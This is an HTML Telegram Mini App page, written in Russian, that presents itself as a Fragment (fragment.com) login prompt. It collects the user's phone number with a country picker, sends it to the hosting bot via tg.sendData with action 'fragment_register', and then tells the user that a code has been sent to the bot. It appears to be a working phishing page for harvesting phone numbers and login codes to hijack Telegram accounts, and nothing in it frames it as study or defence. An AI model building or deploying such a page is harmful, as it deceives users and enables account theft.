<!DOCTYPE html>
<html>
<head>
    <title>Fragment</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        
        body {
            background: #ffffff;
            min-height: 100vh;
            padding: 20px;
        }
        
        .header {
            text-align: center;
            margin-bottom: 30px;
            padding-top: 20px;
        }
        
        .logo {
            font-size: 32px;
            margin-bottom: 15px;
        }
        
        .title {
            font-size: 20px;
            font-weight: 600;
            color: #000;
            margin-bottom: 10px;
        }
        
        .subtitle {
            font-size: 14px;
            color: #6B7280;
            line-height: 1.4;
            margin-bottom: 5px;
        }
        
        .phone-section {
            background: #F9FAFB;
            border-radius: 16px;
            padding: 20px;
            margin-bottom: 20px;
        }
        
        .country-selector {
            margin-bottom: 15px;
        }
        
        .country-btn {
            display: flex;
            align-items: center;
            padding: 12px;
            background: white;
            border-radius: 12px;
            border: 1px solid #E5E7EB;
            width: 100%;
            cursor: pointer;
        }
        
        .flag {
            font-size: 24px;
            margin-right: 12px;
        }
        
        .country-info {
            flex-grow: 1;
            text-align: left;
        }
        
        .country-name {
            font-weight: 600;
            color: #111827;
        }
        
        .country-code {
            font-size: 14px;
            color: #6B7280;
        }
        
        .phone-input {
            display: flex;
            align-items: center;
            background: white;
            border-radius: 12px;
            padding: 12px;
            border: 1px solid #E5E7EB;
        }
        
        .prefix {
            font-weight: 600;
            color: #111827;
            margin-right: 8px;
        }
        
        .phone-input input {
            border: none;
            outline: none;
            font-size: 16px;
            flex-grow: 1;
            background: transparent;
        }
        
        .buttons {
            display: flex;
            gap: 12px;
            margin-top: 30px;
        }
        
        .btn {
            flex: 1;
            padding: 16px;
            border: none;
            border-radius: 12px;
            font-weight: 600;
            font-size: 16px;
            cursor: pointer;
            transition: all 0.2s;
        }
        
        .btn-cancel {
            background: #F3F4F6;
            color: #374151;
        }
        
        .btn-continue {
            background: #007AFF;
            color: white;
        }
        
        .btn:active {
            transform: scale(0.98);
        }
        
        .footer {
            text-align: center;
            margin-top: 30px;
            padding: 20px;
            border-top: 1px solid #F3F4F6;
        }
        
        .footer-text {
            font-size: 12px;
            color: #6B7280;
        }
        
        .dropdown {
            position: relative;
        }
        
        .dropdown-content {
            display: none;
            position: absolute;
            top: 100%;
            left: 0;
            right: 0;
            background: white;
            border: 1px solid #E5E7EB;
            border-radius: 12px;
            max-height: 300px;
            overflow-y: auto;
            z-index: 1000;
        }
        
        .dropdown-item {
            padding: 12px;
            display: flex;
            align-items: center;
            cursor: pointer;
            border-bottom: 1px solid #F3F4F6;
        }
        
        .dropdown-item:last-child {
            border-bottom: none;
        }
        
        .dropdown-item:hover {
            background: #F9FAFB;
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="logo">🔐</div>
        <div class="title">Войдите, чтобы использовать аккаунт Telegram</div>
        <div class="subtitle">для fragment.com и Fragment Auction Alerts.</div>
        <div class="subtitle">Введите свой номер телефона в международном формате.</div>
    </div>
    
    <div class="phone-section">
        <div class="country-selector">
            <div class="dropdown">
                <button class="country-btn" onclick="toggleDropdown()">
                    <div class="flag" id="selected-flag">🇷🇺</div>
                    <div class="country-info">
                        <div class="country-name" id="selected-country">Россия</div>
                        <div class="country-code" id="selected-code">+7</div>
                    </div>
                    <div style="margin-left: auto;">▼</div>
                </button>
                <div class="dropdown-content" id="country-dropdown">
                </div>
            </div>
        </div>
        
        <div class="phone-input">
            <div class="prefix" id="phone-prefix">+7</div>
            <input type="tel" id="phone" placeholder="Введите номер" inputmode="numeric">
        </div>
    </div>
    
    <div class="buttons">
        <button class="btn btn-cancel" onclick="handleCancel()">ОТМЕНА</button>
        <button class="btn btn-continue" onclick="handleContinue()">ДАЛЕЕ</button>
    </div>
    
    <div class="footer">
        <div class="footer-text">Подтверждение будет отправлено в Telegram</div>
    </div>

    <script>
        const countries = [
            { code: '7', flag: '🇷🇺', name: 'Россия' },
            { code: '1', flag: '🇺🇸', name: 'США' },
            { code: '1', flag: '🇨🇦', name: 'Канада' },
            { code: '44', flag: '🇬🇧', name: 'Великобритания' },
            { code: '49', flag: '🇩🇪', name: 'Германия' },
            { code: '33', flag: '🇫🇷', name: 'Франция' },
            { code: '39', flag: '🇮🇹', name: 'Италия' },
            { code: '34', flag: '🇪🇸', name: 'Испания' },
            { code: '86', flag: '🇨🇳', name: 'Китай' },
            { code: '81', flag: '🇯🇵', name: 'Япония' },
            { code: '82', flag: '🇰🇷', name: 'Корея' },
            { code: '91', flag: '🇮🇳', name: 'Индия' },
            { code: '55', flag: '🇧🇷', name: 'Бразилия' },
            { code: '52', flag: '🇲🇽', name: 'Мексика' },
            { code: '61', flag: '🇦🇺', name: 'Австралия' }
        ];

        let selectedCountry = countries[0];
        let tg = window.Telegram.WebApp;

        tg.expand();
        tg.enableClosingConfirmation();
        
        function populateCountries() {
            const dropdown = document.getElementById('country-dropdown');
            dropdown.innerHTML = '';
            
            countries.forEach(country => {
                const item = document.createElement('div');
                item.className = 'dropdown-item';
                item.innerHTML = '<div class="flag">' + country.flag + '</div><div class="country-info"><div class="country-name">' + country.name + '</div><div class="country-code">+' + country.code + '</div></div>';
                item.onclick = function() { selectCountry(country); };
                dropdown.appendChild(item);
            });
        }

        function selectCountry(country) {
            selectedCountry = country;
            document.getElementById('selected-flag').textContent = country.flag;
            document.getElementById('selected-country').textContent = country.name;
            document.getElementById('selected-code').textContent = '+' + country.code;
            document.getElementById('phone-prefix').textContent = '+' + country.code;
            toggleDropdown();
            document.getElementById('phone').focus();
        }

        function toggleDropdown() {
            const dropdown = document.getElementById('country-dropdown');
            if (dropdown.style.display === 'block') {
                dropdown.style.display = 'none';
            } else {
                dropdown.style.display = 'block';
                populateCountries();
            }
        }

        function handleCancel() {
            tg.close();
        }
        
        function handleContinue() {
            const phoneInput = document.getElementById('phone');
            const phone = phoneInput.value.replace(/\D/g, '');
            
            if (phone.length >= 5) {
                const fullPhone = '+' + selectedCountry.code + phone;
                
                tg.sendData(JSON.stringify({
                    phone: fullPhone,
                    action: 'fragment_register'
                }));
                
                tg.showPopup({
                    title: 'Код отправлен',
                    message: 'Проверьте сообщения в боте',
                    buttons: [{ type: 'ok' }]
                });
                
            } else {
                tg.showPopup({
                    title: 'Ошибка',
                    message: 'Введите корректный номер телефона',
                    buttons: [{ type: 'ok' }]
                });
            }
        }
        
        document.addEventListener('DOMContentLoaded', function() {
            populateCountries();
            document.getElementById('phone').focus();
        });
        
        document.addEventListener('click', function(event) {
            const dropdown = document.getElementById('country-dropdown');
            const btn = document.querySelector('.country-btn');
            if (!btn.contains(event.target)) {
                dropdown.style.display = 'none';
            }
        });
    </script>
</body>
</html>
